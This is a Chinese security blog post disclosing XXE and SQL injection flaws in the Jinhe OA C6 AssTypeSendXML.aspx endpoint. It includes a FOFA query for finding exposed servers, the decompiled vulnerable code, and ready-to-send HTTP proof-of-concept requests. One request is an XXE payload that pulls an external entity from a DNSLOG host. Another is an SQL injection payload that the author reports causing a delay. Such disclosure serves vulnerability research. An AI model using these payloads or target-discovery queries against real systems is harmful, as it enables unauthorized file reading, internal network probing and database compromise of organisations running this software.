---
title: "金和OA AssTypeSendXML.aspx XXE+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-AssTypeSendXML-xxe-sqli.html
asset_dir: assets/金和oa-asstypesendxml.aspx-xxe+sql注入漏洞
---

# 金和OA AssTypeSendXML.aspx XXE+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/11/25 13:31
* 463浏览
* [0评论](#comment)
* 13分钟阅读

深入探索

计算机安全

编码转换工具

服务器安全服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AssTypeSendXML.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

SQL注入检测工具

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `AssTypeSendXML.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Ask.dll` 将其进行反编译后找到 **AssTypeSendXML** 的处理逻辑

深入探索

网页浏览器

数据库

Web安全书籍

```
protected void Page_Load(object sender, EventArgs e)
{
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  XmlDataDocument xmlDataDocument = new XmlDataDocument();
  ((XmlDocument) xmlDataDocument).Load(this.Request.InputStream);
```

请求内容直接使 `xmlDataDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

同时存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞

[![金和OA AssTypeSendXML.aspx XXE+SQL注入漏洞](images/img-001-ca656df33c06.webp)](https://image.mrxn.net/d228a3b40ee440d7aaa705dd0ddb2175.webp)

**对应 XML 输入满足以下条件即可：**

代码安全审计

* 第一节点（索引0）值为上述任意条件的字符串（如 "1"、"2"、"3"、"6"、"7"、"8"、"9"、"10"）。
* 节点数量不足，导致无法为 `str2` 赋值（即节点数小于3或4，具体见上面逻辑）。

# 漏洞复现

深入探索

安全研究报告

安全研究工具

VPN服务

## XXE

```
POST /c6/Jhsoft.Web.Asset/AssTypeSendXML.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

漏洞修复方案

[![金和OA AssTypeSendXML.aspx XXE+SQL注入漏洞](images/img-002-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

## SQL

```
POST /c6/Jhsoft.Web.Asset/AssTypeSendXML.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<root>
  <type>2</type><assetTypeID>1001'SQLI_POC</assetTypeID>
</root>
```

[![金和OA AssTypeSendXML.aspx XXE+SQL注入漏洞](images/img-003-72fe101cae8f.webp)](https://image.mrxn.net/a4f01c852a8445beaee0cba414d30f43.webp)

成功延时 2 秒

编程

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.XXE](#toc-5-1-)
* [5.2.SQL](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA AssTypeSendXML.aspx XXE+SQL注入漏洞](https://mrxn.net/jswz/jhsoft-AssTypeSendXML-xxe-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-AssTypeSendXML-xxe-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALYklEQVR4AeycgXLjNgxE/fr//9xmBS8JQpSs+JzYnWPmcAssFiBNiLGT6/Sf2+3277P278mXe1pSY/HmKipXzZoj3nlh1ZzF0l+12ifXOZe5Z3wN5Ktu/fmUE2gD+Zrw7arVzQM3oNLTGNi0wDT/ShJoawHT1vU1Z9FRDtj65nyuk59zj3zpbW0gJha+9wR2A4GYPuzxaKt+Ao7y4q2ZofLZ4HhtiFzW23fvGldeeYg+MKK1Qun+1GDsDz2e9d4NZCZa3O+dwI8NRE+YzC8F4slwLITgpMum3FWb1UH0hcBZL9c55xiiBjpaUxEea2rNo/jHBvJo4ZWfn8BLBwL9iYHw58vOWRhr/NRmdCWEFvZojRH2GgiuahwLva58GYw14l5tLx3Iqzf3N/b7mYH8jSf5ote8G4iv6QyP1oTrVxlCC+za1TWzANh+GDNXtTmumhpLa84orppzxprPsTUVs6b6Vat4NxCRy953Am0gEE8gPMaj7eYn4BkNxNquhYiB9msd54zQNea+g94zRJ9cCyMH8xjIZZsPbDcaHuNWcP+rDeQeL3jzCfzjJ+QZrHuH/jTUnGPYayC4qsl7glFjbdaYM0LUWGNeaA5GDUQMSDaYawayBNY8i+uGlAN9d/hwIMDD74V+Gs5ezExj7gjP+sHxvlznvo4zQtRnTr5rhIplEFoYURqbdDIYNeKODEKb8w8HksXL//kT+AfGKUHEEDjbQn0qrDEvNHeGMF8D9rx6Zpv1db7mIPpBxyNN5t2vojVw3M811l7F/9MNufqa/te6NZAPG1/72Atx/a5cNZhrIXjoP8hB56DzXkcIofHZiJNB8NCxahxnVK3MnHyZ4+8ixPq1Tj1tNecYohYwdYrrhpwez+8nd2/q3sJs8uaMwPCR2LUZrTUHvcZcRQhN5msf58wLIepgxJlWelnNQa89ypmH61rVQOjly7S+DIIHbuuG3D7rq72HHG1LE7RBnyT094NZLYzameY7HIz9IOLcw/s05xj2WmuMEBrXCCE4CLR2hhAaCLRGfao5Z8z5dUN8Kh+C7T3EU4KYMOzRGuOV12CtcVbjHMSa1pjPWHOOM1oPYz+IGDrmuke++850Z7mZXhzEPuTb1g3xSXwIroF8yCC8jTYQiOvjq2e0UAihgRGVk7kmo3gZRM2VnPRH5nrnIfoCphpWreOMTXx3gPZRPuvk3yXTf72EqPuOxtqMbSCZXP77TqANRE+ADMZJ560pn805cxC1sEdrv4PQ+7gOgnPstYXmIDQQOOPNGVVfDY7roX/sV537GCFqoaN0MmuM0DVtIE4ufO8JtIFATEkTlMEYZw7GHIyxtH5Z8rNBaKGjtRVndeaqdhZbO8Oqh9hP5XPsPpmz75xxxsO4hrUZ20DcYOF7T+Dhr04gpgrj90xNFSLnlwARQ9fWnOpszjmGqDefsWogtLDHXHfkQ9S5r3UQPPTXAMFZY4TgAVPtE1ojThxg02fJuiH5ND7A3/3qxHvyk5PRORgnmzX2YdTUWuhPoHNG93AshHk/a4XSZYOxBiKG/dqqrwahN+/eNTaf8UwD0Tfr7a8b4pN4LT7dbQ3k6aP7mcLdmzocXydvoV5H2NdYA2POvBAiB4HiZBCx18uovCxz9sXLHFdUzlZzEGtCR2sguBq7l9A5+TIYa5QXPzMILbD+xfD2YV/tTR1iSnV/EDzs8UzrnJ8Ix9D7mDNC5GoM/U0YjjUw5ura7iuEudY1Qulk8mXyZfJlED1gj9LJoOcUz0y9bOs9ZHZCb+S+NRBPsaL3n3noTwZgyYDWm6yxeSEw/BBl7QylnxlED7h249wbos49YYzFW1tRORtEHYzovPBbA1HBsp89gcOBQExxtjzMcxA89CdwVm8OQu/Y6KfM8RlC9AB2MmC4VVkA85zXFmb9VR/mfa/WHw7kaoOle+0JrIG89jz/uNvuB0N31JWVOc4oXpY5+eJsMF5d89LZzBkhaiDQfEbXGs9y1kD0c5zR9eYgtICphsDht0CLaj/zQueM4qqtG1JP5M1x+8HQ+zibHsQTAiO69gwharIG9lzOn/kQtbBH1/m1nCFEvWsywpirfWZaiBoInGkyV/11Q+qJvDlu7yGePuwnW/dorXnHELVw7WOv6yHq3McIwQOW7tBaoZPyZcD2PR8CnRfCnhOvOptiWY1hX1s1jjOqlwz29eJl64boFD7I2kBgnBqMsfbsaUPkjmLxEBrVycQdmfIyiBoIFFet9oDQAk0KbDfDWicgeMDUKR7Vm88IDGtCxNDRi7nOccY2kEwu/30n8PBTlqcphJi2fNnZtpWXWQNR61gIwUn3yKSfWa6b5cVlTfWVl0HsBfaovMy1EBpx1SBy1uZ85Wos7bohOoUPsjcM5INe/QdupQ2kXh/HEFcQ+kdZ6BzQXhawvbFBR/cxNnFyoOuh+0nylAu9FzDt4X3N0AXA8Lqshc6bM0Lk3EMIwUGguGptIDWx4vecQBsIxNQg0NvxxIUzTrzN+Yww9oOIod+4s/rcK/vQ+0D4OS/ffY0QOugonQyCk39k7uO8YyFEPQTONJWDUat8G4iCZe8/gd2vTjRt2WxrEBOFOaqumvtA1DieoWudg6gBTLXv5SZck9E5oOkB0xtaD2yaGgOb7uwvYKuF49sOXeNeEJzjjOuG5NP4AP9wIBBThI5+iozev2PoWueM1mR07gizFqK3tc45nmHVOBZWPUR/5WxVcyWGsU+ucV9jztk/HIgFC3/3BNZAfve8H662+10WxJVzpa+X0ByMGvPS2CoHUQMdranoHtC15qoWQgO0lLXA9qbruAm+HIjcl7v9mWm2xNdfzsG8Rvkv2fZHvgxG7ZYsf0kng9AC6z+2vn3YV/uWBTElTSwbBA+0ree8/JaYOMD2lDolvc3cEVonrBoY+yoPI6c6mXJHprwMohY61hrpZJXPMUS9OeltEDkY0XlhG4gbLHzvCex+MLyyHRgn7BoYecCp6f8fpCXvDrDdJtjjXdL66Gk6MhjrXQudr9xRL/EQda4xQvDQUXrZTGNOeZnjjOuG5NP4AL8NBPqUofuzPWq62WaaykHvCXPfPWvtLIbokXMQnPsYs6b61kDU5jzsuZzP/lEf8xlznXyIdYD1Kev2YV/t55A8Qfln+4SYqDUQseoemWtmCNHHudzLHIwaiBiwpL0PNeLu5H72gU1/lzwNMO8DwUPHs0Xat6wz0cr93gmsgZye9e8n28feurSvdEZrzDk2wv5aQnDWuFY44zLvvBCO+6gmm/Qzg+gBHV030x/lIOpzjbUVs8Y+jPW5Zt0Qn9KHYHtTh5gaXMf6GvKkIfpYAxFDR+urxvEVhN7vit4arw1RX2MIHvq/BtZaxxkh6jJn32tUdF64bohO4YOsDaRO7Sw+2j/E0wEcSU55r2kRsH0khf1Tao1rhOaM0OsB01MEtrWmyTsJoYHAOz2A9iEbyAcBRD9g/WB4+7CvdkO8L+jTgtG35grqKck2q4GxP0Rsba6HMQcRwx5rfY3VF6JullNe5hyEVlw254UQGhhRORtEzrEx99wNxKKF7zmBNZD3nPvhqi8ZiK9cXgUeX8+sz/6snzmj9Y5nCLEH5yBi6B8SnHO/GVYNRB/zwlonrpo1EPWOM75kILnh8v/sBF46kPxEeFsQT4NzEDFgScOZBtg+jsKIrSg5MGrcL0maC6FtxN2B4IE7c2vr3+5fZ33vkgbAt+pfOpC2i+U8fQK7gXj6M/zOKq53DcSTYl7oXEXlqllj3nHGoxwcrw2Rcx/3mKE1EDXQseohcq65iruBXC1cup85gTYQiInCYzzaCvTaZzQQ9Ue1mfcTmTkY62EeA7nssg9s7wdeO2Nt4lzmZ5zyEH2B9auT24d9tRvyYfv6a7fzHwAAAP//svgNlwAAAAZJREFUAwBckaKkhuKwKQAAAABJRU5ErkJggg==)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AssTypeSendXML-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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